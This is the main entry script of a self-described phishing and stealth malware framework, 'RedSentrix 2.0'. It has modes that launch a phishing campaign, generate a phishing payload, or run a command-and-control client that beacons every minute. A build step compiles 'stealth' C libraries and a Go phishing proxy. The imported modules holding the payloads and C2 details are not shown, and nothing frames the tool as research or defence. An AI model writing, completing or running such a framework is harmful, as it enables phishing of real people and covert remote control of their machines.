#!/usr/bin/env python3
"""
RedSentrix 2.0 - Advanced Phishing + Stealth Malware Framework
Main entry point
"""

import sys
import argparse
from pathlib import Path

# Add core to path
sys.path.insert(0, str(Path(__file__).parent))

from core.orchestrator import Orchestrator
from core.logger import Logger


def main():
    parser = argparse.ArgumentParser(description="RedSentrix 2.0 Framework")
    parser.add_argument(
        "-c", "--config",
        default="config/phishing.yaml",
        help="Configuration file path"
    )
    parser.add_argument(
        "-m", "--mode",
        choices=["phishing", "payload", "c2"],
        default="phishing",
        help="Operation mode"
    )
    parser.add_argument(
        "--build",
        action="store_true",
        help="Build C libraries and Go binaries"
    )
    
    args = parser.parse_args()
    
    logger = Logger()
    logger.log("Starting RedSentrix 2.0...", "info")
    
    # Build if requested
    if args.build:
        logger.log("Building components...", "info")
        build_components()
    
    # Initialize orchestrator
    try:
        orchestrator = Orchestrator(config_path=args.config)
        
        # Start based on mode
        if args.mode == "phishing":
            orchestrator.start()
        elif args.mode == "payload":
            # Generate payload only
            payload = orchestrator.generate_phishing_payload()
            print(f"Generated payload: {payload[:100]}...")
        elif args.mode == "c2":
            # C2 mode
            orchestrator.connect_c2()
            if orchestrator.c2_client:
                while True:
                    orchestrator.c2_client.beacon()
                    import time
                    time.sleep(60)
        
    except KeyboardInterrupt:
        logger.log("Shutting down...", "info")
        if 'orchestrator' in locals():
            orchestrator.stop()
    except Exception as e:
        logger.log(f"Fatal error: {e}", "error")
        sys.exit(1)


def build_components():
    """Build C libraries and Go binaries"""
    import subprocess
    from pathlib import Path
    
    # Build C libraries
    stealth_dir = Path("stealth")
    if stealth_dir.exists():
        print("Building C stealth libraries...")
        result = subprocess.run(["make", "-C", str(stealth_dir)], capture_output=True)
        if result.returncode != 0:
            print(f"Build failed: {result.stderr.decode()}")
    
    # Build Go phishing proxy
    phishing_dir = Path("phishing")
    if phishing_dir.exists():
        print("Building Go phishing proxy...")
        result = subprocess.run(
            ["go", "build", "-o", "build/phishing/proxy", "./phishing/proxy"],
            cwd=Path.cwd(),
            capture_output=True
        )
        if result.returncode != 0:
            print(f"Build failed: {result.stderr.decode()}")


if __name__ == "__main__":
    main()


